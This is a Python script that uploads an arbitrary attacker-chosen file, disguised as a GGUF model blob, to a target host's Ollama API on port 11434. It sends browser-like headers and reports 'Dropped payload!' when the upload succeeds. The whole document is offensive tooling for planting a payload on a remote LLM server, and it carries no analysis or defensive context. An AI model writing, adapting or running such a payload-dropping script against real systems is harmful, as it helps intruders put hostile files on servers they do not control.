import requests
import struct
import hashlib
import os
import argparse





parser = argparse.ArgumentParser()
parser.add_argument("--target")
parser.add_argument("--payload")
args = parser.parse_args()

headers = {
    "Host": f"{args.target}:11434",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Purpose": "prefetch;prerender",
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
}


def Upload(payload_path):
    print("[*] Trying to upload file...")
    with open("payload.gguf", "rb") as f:
        #Getting the sha256 of the file
        sha256 = hashlib.sha256(f.read()).hexdigest()
        print(f"[+] SHA256: {sha256}")
    f.close()
    #Sending it to the specified URL/IP as a POST request
    url = f"http://{args.target}:11434/api/blobs/sha256:{sha256}"
    with open("payload.gguf", "rb") as f:
        response = requests.post(url, headers=headers, data=f)
    
    if response.status_code == 201:
        print("[+] Dropped payload!")
    else:
        print("[-] Failed to drop payload")
        exit(1)


def GetFileAndHash():
    if not os.path.exists(args.payload):
        print("[-] Path doesn't exist.")
        exit(1)
    
    with open(args.payload, "rb") as f:
        data = f.read()
    
    #Reading the data of the provided payload and then writing them into a gguf file
    #A gguf file is a filetype used to store Large language models in a way that makes the efficient to load
    if not data:
        print("File is empty")

    with open("payload.gguf", "wb") as s:
        s.write(data)
    
    f.close()
    s.close()
    Upload("payload.gguf")



if __name__ == "__main__":
    GetFileAndHash()